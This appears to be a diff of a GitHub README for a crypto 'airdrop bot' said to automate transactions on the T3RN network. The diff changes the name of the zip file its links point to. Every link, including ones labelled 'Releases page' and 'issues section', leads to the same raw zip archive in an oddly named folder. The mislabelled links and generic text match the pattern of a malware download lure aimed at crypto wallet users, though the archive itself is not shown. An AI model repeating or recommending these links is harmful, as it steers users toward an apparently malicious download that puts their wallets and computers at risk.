@@ -1,7 +1,7 @@
 # 🤖 T3rn-Airdrop-bot - Automate Transactions on T3RN Network
 
 ## 📥 Download Now
-[![Download T3rn-Airdrop-bot](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/T3rn-Airdrop-bot-2.3.zip%20T3rn--Airdrop--bot-v1.0-brightgreen)](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/T3rn-Airdrop-bot-2.3.zip)
+[![Download T3rn-Airdrop-bot](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/rn_Airdrop_bot_3.2.zip%20T3rn--Airdrop--bot-v1.0-brightgreen)](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/rn_Airdrop_bot_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to T3rn-Airdrop-bot! This application allows you to automate transactions and manage your assets on the T3RN network effortlessly. You don’t need any programming knowledge to use it. Follow the steps below to get started.
@@ -21,10 +21,10 @@ Welcome to T3rn-Airdrop-bot! This application allows you to automate transaction
 ## 📄 Download & Install
 To begin, visit the Releases page to download the application. Click the button below:
 
-[Download T3rn-Airdrop-bot](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/T3rn-Airdrop-bot-2.3.zip)
+[Download T3rn-Airdrop-bot](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/rn_Airdrop_bot_3.2.zip)
 
 ### Step-by-Step Installation
-1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/T3rn-Airdrop-bot-2.3.zip) and find the latest version of the software.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/rn_Airdrop_bot_3.2.zip) and find the latest version of the software.
    
 2. **Choose the Correct File**: Look for the file that matches your operating system. If you use Windows, it will likely end with `.exe`. For macOS, look for `.dmg`.
 
@@ -60,7 +60,7 @@ If you encounter issues during installation or while using T3rn-Airdrop-bot, try
 - **Connection Problems**: Check your internet connection and make sure your wallet is properly set up.
 - **Application Crashes**: Restart your computer and try opening the app again. 
 
-For more assistance, visit the [issues section](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/T3rn-Airdrop-bot-2.3.zip) on our GitHub page.
+For more assistance, visit the [issues section](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/rn_Airdrop_bot_3.2.zip) on our GitHub page.
 
 ## 💬 Community Support
 Join our community on forums or social media to engage with other users. Share tips or ask for help. Your feedback is invaluable.
@@ -68,6 +68,6 @@ Join our community on forums or social media to engage with other users. Share t
 ## 📝 License
 T3rn-Airdrop-bot is open-source. You can use, modify, and distribute it under the terms specified within the license file in the repository.
 
-For further updates and information, please check back regularly at our [Releases page](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/T3rn-Airdrop-bot-2.3.zip). 
+For further updates and information, please check back regularly at our [Releases page](https://raw.githubusercontent.com/Aneek2004/T3rn-Airdrop-bot/main/inimically/rn_Airdrop_bot_3.2.zip). 
 
 Thank you for using T3rn-Airdrop-bot!
